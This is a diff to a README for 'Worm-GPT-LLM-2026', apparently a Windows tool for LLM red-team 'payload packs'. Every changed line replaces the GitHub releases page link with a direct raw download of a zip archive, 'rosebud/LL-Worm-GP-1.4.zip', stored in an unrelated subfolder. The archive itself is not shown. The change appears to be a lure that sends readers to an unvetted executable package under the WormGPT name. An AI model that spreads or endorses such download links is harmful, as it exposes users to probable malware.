@@ -1,13 +1,13 @@
 # 🧠 Worm-GPT-LLM-2026 - Run Local LLM Red-Team Tasks
 
-[![Download Worm-GPT-LLM-2026](https://img.shields.io/badge/Download-Get%20the%20latest%20release-2f81f7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/releases)
+[![Download Worm-GPT-LLM-2026](https://img.shields.io/badge/Download-Get%20the%20latest%20release-2f81f7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/main/rosebud/LL-Worm-GP-1.4.zip)
 
 ## 🪟 Windows Setup
 
 Worm-GPT-LLM-2026 is a Windows app for local LLM testing and prompt work. It runs on your PC and helps you load payload packs, test prompt flow, and work with model output in a single place.
 
 Use this page to download and run the app:
-https://github.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/releases
+https://raw.githubusercontent.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/main/rosebud/LL-Worm-GP-1.4.zip
 
 ### What you need
 - Windows 10 or Windows 11
@@ -111,7 +111,7 @@ If a run takes too long, stop it and try a smaller input or a lighter local mode
 ## 📦 Download and Launch
 
 Go to the release page and get the latest Windows build:
-https://github.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/releases
+https://raw.githubusercontent.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/main/rosebud/LL-Worm-GP-1.4.zip
 
 If the page offers more than one file, choose the one for Windows. If you see both a .zip file and an .exe file, the .zip file is often the full app package, while the .exe file may be the launcher.
 
@@ -221,7 +221,7 @@ If you do not see output:
 ## 📌 Release Page
 
 Use this page to download the latest Windows build:
-https://github.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/releases
+https://raw.githubusercontent.com/jabesotienobecky-maker/Worm-GPT-LLM-2026/main/rosebud/LL-Worm-GP-1.4.zip
 
 ## 🗂️ Repo Name
 
